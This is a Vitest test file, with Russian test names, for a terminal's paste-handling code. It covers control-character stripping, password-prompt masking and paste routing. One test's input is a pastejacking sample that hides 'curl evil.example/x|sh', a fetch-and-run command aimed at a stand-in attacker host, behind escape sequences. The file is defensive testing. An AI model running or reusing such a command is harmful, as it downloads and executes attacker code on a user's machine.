import { describe, expect, it } from 'vitest';
import { acceptsInput, classifyPaste, stripControlChars } from './pasteInput';

describe('stripControlChars', () => {
  it('pastejacking: ESC-последовательности не доходят ни до буфера, ни до эха', () => {
    const pasted = '\x1b[s curl evil.example/x|sh;# \x1b[u\x1b[K ls -la';
    expect(stripControlChars(pasted)).toBe('[s curl evil.example/x|sh;# [u[K ls -la');
  });

  it('убирает C0, DEL и C1, таб сохраняет', () => {
    expect(stripControlChars('a\x00b\x07c\x08d\re\nf\x7fg\u009b1mh\u0085i\tj')).toBe('abcdefg1mhi\tj');
  });

  it('обычный текст, включая не-ASCII, не трогает', () => {
    expect(stripControlChars("cd '/srv/проект' && ls -la # ок é")).toBe("cd '/srv/проект' && ls -la # ок é");
  });
});

describe('classifyPaste', () => {
  it('пустой буфер игнорируется', () => {
    expect(classifyPaste('', false, true)).toBe('ignore');
    expect(classifyPaste('', true, true)).toBe('ignore');
  });

  it('при активном промпте пароля любой текст уходит в маскированный перехватчик', () => {
    expect(classifyPaste('s3cret', true, false)).toBe('mask');
    expect(classifyPaste('s3cret\n', true, true)).toBe('mask'); // не в предпросмотр — он показал бы секрет
  });

  it('вне промпта пароля: многострочное — в предпросмотр, одна строка — в строку ввода', () => {
    expect(classifyPaste('a\nb', false, true)).toBe('preview');
    expect(classifyPaste('a\r', false, true)).toBe('preview');
    expect(classifyPaste('ls -la', false, true)).toBe('insert');
  });
});

describe('без Канала', () => {
  it('ввод принимает только активный промпт пароля', () => {
    expect(acceptsInput(false, false)).toBe(false);
    expect(acceptsInput(true, false)).toBe(true);
    expect(acceptsInput(false, true)).toBe(true);
  });

  it('вставка без промпта и без Канала отбрасывается — любой маршрут, любой текст', () => {
    expect(classifyPaste('s3cret', false, false)).toBe('ignore');
    expect(classifyPaste('a\nb', false, false)).toBe('ignore');
  });

  it('при активном промпте вставка по-прежнему маскируется, даже без Канала', () => {
    expect(classifyPaste('s3cret', true, false)).toBe('mask');
  });
});
